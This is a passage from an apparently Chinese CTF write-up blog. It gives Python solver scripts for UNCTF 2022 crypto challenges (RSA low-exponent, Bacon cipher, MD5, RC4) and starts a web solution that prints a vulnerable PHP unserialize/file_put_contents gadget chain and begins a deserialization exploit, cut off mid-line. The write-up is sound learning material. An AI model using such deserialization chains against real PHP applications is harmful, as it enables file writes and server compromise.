class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">import</span> libnum<br><br><br>p = <span class="hljs-number">89065756791595323358603857939783936930073695697065732353414009005162022399741</span><br>q =(p**<span class="hljs-number">4</span>-p**<span class="hljs-number">3</span>)//(p-<span class="hljs-number">1</span>)<br><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">56959646997081238078544634686875547709710666590620774134883288258992627876759606112717080946141796037573409168410595417635905762691247827322319628226051756406843950023290877673732151483843276348210800329658896558968868729658727981445607937645264850938932045242425625625685274204668013600475330284378427177504</span><br><span class="hljs-comment"># n = 73069886771625642807435783661014062604264768481735145873508846925735521695159</span><br><br>n=<span class="hljs-number">62927872600012424750752897921698090776534304875632744929068546073325488283530025400224435562694273281157865037525456502678901681910303434689364320018805568710613581859910858077737519009451023667409223317546843268613019139524821964086036781112269486089069810631981766346242114671167202613483097500263981460561</span><br>d = gmpy2.invert(e, p**<span class="hljs-number">4</span>-p**<span class="hljs-number">3</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;d=&quot;</span>, d)<br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(m)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744922.png" alt="image-20221117202656884"></p><h2 id="babyRSA-广东海洋大学"><a href="#babyRSA-广东海洋大学" class="headerlink" title="babyRSA-广东海洋大学"></a>babyRSA-广东海洋大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744923.png" alt="image-20221119104645190"></p><p>babyRSA.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">import</span> libnum<br>flag=<span class="hljs-string">&quot;UNCTF&#123;*************************&#125;&quot;</span> <br>m=libnum.s2n(flag)<br>p=libnum.generate_prime(<span class="hljs-number">1024</span>)<br>q=libnum.generate_prime(<span class="hljs-number">1024</span>)<br>n=p*q<br>e=<span class="hljs-number">6</span><br>c=<span class="hljs-built_in">pow</span>(m,e,n)<br>M=((m&gt;&gt;<span class="hljs-number">60</span>)&lt;&lt;<span class="hljs-number">60</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n=&quot;</span>,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c=&quot;</span>,c)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;((m&gt;&gt;60)&lt;&lt;60)=&quot;</span>,M) <br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">25300208242652033869357280793502260197802939233346996226883788604545558438230715925485481688339916461848731740856670110424196191302689278983802917678262166845981990182434653654812540700781253868833088711482330886156960638711299829638134615325986782943291329606045839979194068955235982564452293191151071585886524229637518411736363501546694935414687215258794960353854781449161486836502248831218800242916663993123670693362478526606712579426928338181399677807135748947635964798646637084128123883297026488246883131504115767135194084734055003319452874635426942328780711915045004051281014237034453559205703278666394594859431</span><br><span class="hljs-string">15389131311613415508844800295995106612022857692638905315980807050073537858857382728502142593301948048526944852089897832340601736781274204934578234672687680891154129252310634024554953799372265540740024915758647812906647109145094613323994058214703558717685930611371268247121960817195616837374076510986260112469914106674815925870074479182677673812235207989739299394932338770220225876070379594440075936962171457771508488819923640530653348409795232033076502186643651814610524674332768511598378284643889355772457510928898105838034556943949348749710675195450422905795881113409243269822988828033666560697512875266617885514107</span><br><span class="hljs-string">11941439146252171444944646015445273361862078914338385912062672317789429687879409370001983412365416202240</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>e特别小，想到有一个低加密指数攻击，直接套脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#python3</span><br><span class="hljs-comment">## -*- coding: utf-8 -*-#</span><br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> iroot<br><span class="hljs-keyword">import</span> libnum<br>e = <span class="hljs-number">6</span><br>n=<span class="hljs-number">25300208242652033869357280793502260197802939233346996226883788604545558438230715925485481688339916461848731740856670110424196191302689278983802917678262166845981990182434653654812540700781253868833088711482330886156960638711299829638134615325986782943291329606045839979194068955235982564452293191151071585886524229637518411736363501546694935414687215258794960353854781449161486836502248831218800242916663993123670693362478526606712579426928338181399677807135748947635964798646637084128123883297026488246883131504115767135194084734055003319452874635426942328780711915045004051281014237034453559205703278666394594859431</span><br>c=<span class="hljs-number">15389131311613415508844800295995106612022857692638905315980807050073537858857382728502142593301948048526944852089897832340601736781274204934578234672687680891154129252310634024554953799372265540740024915758647812906647109145094613323994058214703558717685930611371268247121960817195616837374076510986260112469914106674815925870074479182677673812235207989739299394932338770220225876070379594440075936962171457771508488819923640530653348409795232033076502186643651814610524674332768511598378284643889355772457510928898105838034556943949348749710675195450422905795881113409243269822988828033666560697512875266617885514107</span><br><br>k = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    res = iroot(c+k*n,e)  <br>    <span class="hljs-keyword">if</span>(res[<span class="hljs-number">1</span>] == <span class="hljs-literal">True</span>):<br>        <span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(res[<span class="hljs-number">0</span>]))) <br>        <span class="hljs-keyword">break</span><br>    k=k+<span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744924.png" alt="image-20221117203048354"></p><h2 id="今晚吃什么-金陵科技学院"><a href="#今晚吃什么-金陵科技学院" class="headerlink" title="今晚吃什么-金陵科技学院"></a>今晚吃什么-金陵科技学院</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744925.png" alt="image-20221119104703246"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">10000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">00000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">00000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">00000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">00000</span>  <span class="hljs-number">00000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">00000</span>  <span class="hljs-number">00000</span>  <span class="hljs-number">00000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">00000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">00000</span>  <span class="hljs-number">00000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">00000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">00000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">00000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">00000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">00000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">00000</span>  <span class="hljs-number">00000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">00000</span>  <span class="hljs-number">00000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">00000</span>  <span class="hljs-number">00000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">10000</span><br></code></pre></td></tr></table></figure><p>转摩斯</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-\-\-\.\-\.\-\-\-\-\.\-\.\.\-\-\.\.\.\-\.\-\-\-\-\-\.\.\-\.\-\.\-\-\-\.\-\-\-\.\-\-\.\-\.\.\-\-\.\.\-\.\.\-\-</span><br></code></pre></td></tr></table></figure><p>解码：</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744926.png" alt="image-20221117200358369"></p><p>得到TTTETETTTTETEETTEEETETTTTTEETETETTTETTTETTETEETTEETEETT</p><p>根据题目名称想到培根密码转为</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">AAABABAAAABABBAABBBABAAAAABBABABAAABAAABAABABBAABBABBAA</span><br></code></pre></td></tr></table></figure><p>解密培根(有的网站解出来错的，我用的是<a href="http://www.metools.info/code/bacon193.html">这个</a>)</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744927.png" alt="image-20221117200517107"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">UNCTF</span><span class="hljs-template-variable">&#123;CRYPROISFUN&#125;</span><br></code></pre></td></tr></table></figure><h2 id="md5-2-西南科技大学"><a href="#md5-2-西南科技大学" class="headerlink" title="md5-2-西南科技大学"></a>md5-2-西南科技大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744928.png" alt="image-20221119104717534"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><br>flag=<span class="hljs-string">&#x27;UNCTF&#123;%s&#125;&#x27;</span>%md5(<span class="hljs-string">&#x27;x&#x27;</span>.encode()).hexdigest()<br><span class="hljs-comment"># x不是一个字符是n个字符</span><br><br>md5_=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag:<br>    md5_.append(<span class="hljs-built_in">int</span>(md5(i.encode()).hexdigest(),<span class="hljs-number">16</span>)) <span class="hljs-comment">#十六转十进制</span><br><span class="hljs-built_in">print</span>(md5_)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(md5_)):<br>    <span class="hljs-keyword">if</span> i==<span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<span class="hljs-keyword">as</span> file:<br>            file.write(<span class="hljs-built_in">hex</span>(md5_[i])[<span class="hljs-number">2</span>:]+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>         <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<span class="hljs-keyword">as</span> file:<br>            file.write(<span class="hljs-built_in">hex</span>(md5_[i]^md5_[i-<span class="hljs-number">1</span>])[<span class="hljs-number">2</span>:]+<span class="hljs-string">&#x27;\n&#x27;</span>)   <br></code></pre></td></tr></table></figure><p>整个过程就是md5加密后十六进制转十进制，当前位异或前一位，再转十六进制回去</p><p>难度不高，就是中间有点地方编程出了问题，出的有点晚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><br>t = <span class="hljs-number">0</span><br>flag = <span class="hljs-string">&quot;&quot;</span><br>char = <span class="hljs-string">&quot;&quot;</span><br>md5_ = []<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> file.readlines(): <span class="hljs-comment">#a = int(md5(&#x27;N&#x27;.encode()).hexdigest(),16)# </span><br><span class="hljs-comment">#bef = line.strip()</span><br><span class="hljs-built_in">print</span>(i.strip())<br>t += <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> t == <span class="hljs-number">1</span>:<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">128</span>):<br>c = <span class="hljs-built_in">int</span>(md5(<span class="hljs-built_in">chr</span>(j).encode()).hexdigest(), <span class="hljs-number">16</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">hex</span>(c)[<span class="hljs-number">2</span>: ] == i.strip():<br>flag += <span class="hljs-built_in">chr</span>(j)<br>char = c<br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">else</span> :<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">128</span>):<br>c = <span class="hljs-built_in">int</span>(md5(<span class="hljs-built_in">chr</span>(j).encode()).hexdigest(), <span class="hljs-number">16</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">hex</span>(c ^ char)[<span class="hljs-number">2</span>: ] == i.strip():<br>flag += <span class="hljs-built_in">chr</span>(j)<br>char = c<br><span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-built_in">print</span>(flag)<br><br></code></pre></td></tr></table></figure><h2 id="EZcry-广东海洋大学"><a href="#EZcry-广东海洋大学" class="headerlink" title="EZcry-广东海洋大学"></a>EZcry-广东海洋大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744929.png" alt="image-20221119104732055"></p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">enc</span> -&gt;</span><span class="hljs-number">28215806134317522883596419220825657511411006710664649462842055320370860932420278362078094716</span><br><span class="hljs-function"><span class="hljs-title">key</span> -&gt;</span> <span class="hljs-number">3544952156018063160</span><br></code></pre></td></tr></table></figure><p>题目给了提示，流密码</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744930.png" alt="image-20221118195812950"></p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> ARC4<br><span class="hljs-keyword">import</span> libnum<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4de</span>(<span class="hljs-params">data, key1</span>):        <span class="hljs-comment"># 解密</span><br>    <span class="hljs-comment"># data = base64.b64decode(data)</span><br>    enc = ARC4.new(key)<br>    res = enc.decrypt(data)<br>    res = <span class="hljs-built_in">str</span>(res,<span class="hljs-string">&#x27;gbk&#x27;</span>)<br>    <span class="hljs-keyword">return</span> res<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    encrypt_data = libnum.n2s(<span class="hljs-number">28215806134317522883596419220825657511411006710664649462842055320370860932420278362078094716</span>)   <span class="hljs-comment"># 需要加密的内容</span><br>    key = libnum.n2s(<span class="hljs-number">3544952156018063160</span>)  <span class="hljs-comment"># 加密key</span><br>    <span class="hljs-built_in">print</span>(rc4de(encrypt_data, key))      <span class="hljs-comment"># 解密</span><br></code></pre></td></tr></table></figure><h1 id="end"><a href="#end" class="headerlink" title="end"></a>end</h1><p>感谢主办方，感谢出题的各位师傅。</p>]]></content>
    
    
    <categories>
      
      <category>writeup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>2022</tag>
      
      <tag>UNCTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022_天权信安&amp;catf1ag网络安全联合公开赛</title>
    <link href="/2023/01/10/2022%E5%A4%A9%E6%9D%83%E4%BF%A1%E5%AE%89&amp;catf1ag%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E5%90%88%E5%85%AC%E5%BC%80%E8%B5%9B/"/>
    <url>/2023/01/10/2022%E5%A4%A9%E6%9D%83%E4%BF%A1%E5%AE%89&amp;catf1ag%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E5%90%88%E5%85%AC%E5%BC%80%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="2022-天权信安-amp-catf1ag网络安全联合公开赛"><a href="#2022-天权信安-amp-catf1ag网络安全联合公开赛" class="headerlink" title="2022 天权信安&amp;catf1ag网络安全联合公开赛"></a>2022 天权信安&amp;catf1ag网络安全联合公开赛</h1><p>前段时间在忙考试，很久没更新了，把之前的wp补一下哈哈。</p><p>这场比赛我只写了web</p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="ezlogin"><a href="#ezlogin" class="headerlink" title="ezlogin"></a>ezlogin</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101721512.png" alt="image-20221209120645149"></p><p>robots.txt</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">Disallow: <span class="hljs-regexp">/imdex.php/</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101721514.png" alt="image-20221209110745150"></p><p>路径经过一次hex，两次base64加密</p><p>以source.php为例</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">/imdex.php?<span class="hljs-attribute">way</span>=TnpNMlpqYzFOekkyTXpZMU1tVTNNRFk0TnpBPQ==<br></code></pre></td></tr></table></figure><p>imdex.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL || ~ E_NOTICE);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;way&#x27;</span>]) )<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Refresh:0;url=./imdex.php?way=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&#x27;</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;way&#x27;</span>])));<br><br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$file</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p style=&#x27;text-align:center&#x27;&gt;&lt;img src =&#x27;image/ok.jpg&#x27;&gt;&lt;/p&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;hacker! no flag!!!&quot;</span>);<br>&#125;<span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$file</span>==<span class="hljs-string">&quot;source.php&quot;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location:./surprise/source.php&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/gif;try the way,source.php&#x27;&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>&#x2F;suprise&#x2F;source.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hello</span>;<br>    <span class="hljs-keyword">public</span><span class="hljs-title function_ invoke__"> function __construct</span>()&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;hello = <span class="hljs-keyword">new</span> C;<br>    &#125;<br>    <span class="hljs-keyword">public</span><span class="hljs-title function_ invoke__"> function __toString</span>()&#123;<br>        <span class="hljs-keyword">if</span><span class="hljs-title function_ invoke__"> </span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$this</span>-&gt;hello))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;hello-&gt;<span class="hljs-title function_ invoke__">world</span>();<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Are you ok? Small dog&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123; <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span>;<br>    <span class="hljs-keyword">public</span><span class="hljs-title function_ invoke__"> function __construct</span>(<span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$text</span>=<span class="hljs-string">&#x27;&#x27;</span>) &#123;<br>        <span class="hljs-variable language_">$this</span> -&gt; file = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-variable language_">$this</span> -&gt; text = <span class="hljs-variable">$text</span>;<br>        <br>    &#125;<br>    <span class="hljs-keyword">public</span><span class="hljs-title function_ invoke__"> function world</span>()&#123;<br>        <span class="hljs-variable">$d   </span>= <span class="hljs-string">&#x27;&lt;?php die(&quot;886&quot;);?&gt;&#x27;</span>;<br>        <span class="hljs-variable">$a</span>= <span class="hljs-variable">$d</span>. <span class="hljs-variable language_">$this</span>-&gt;text;<br>         <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt; file,<span class="hljs-variable">$a</span>);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<br>    <span class="hljs-keyword">public</span><span class="hljs-title function_ invoke__"> function world</span>()&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello,world!&quot;</span>;<br>    &#125;<br>&#125;<br><br>    <span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]; <br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$cmd</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$IO </span>= <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$cmd</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;where is your chain?&quot;</span>;<br>    &#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>可以参考这篇<a href="https://baijiahao.baidu.com/s?id=1710140843184029370&wfr=spider&for=pc">合天的文章</a>，百度一下死亡之exit绕过，有很多文章可以参考</p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$hello</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;hello=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">B</span>(<span 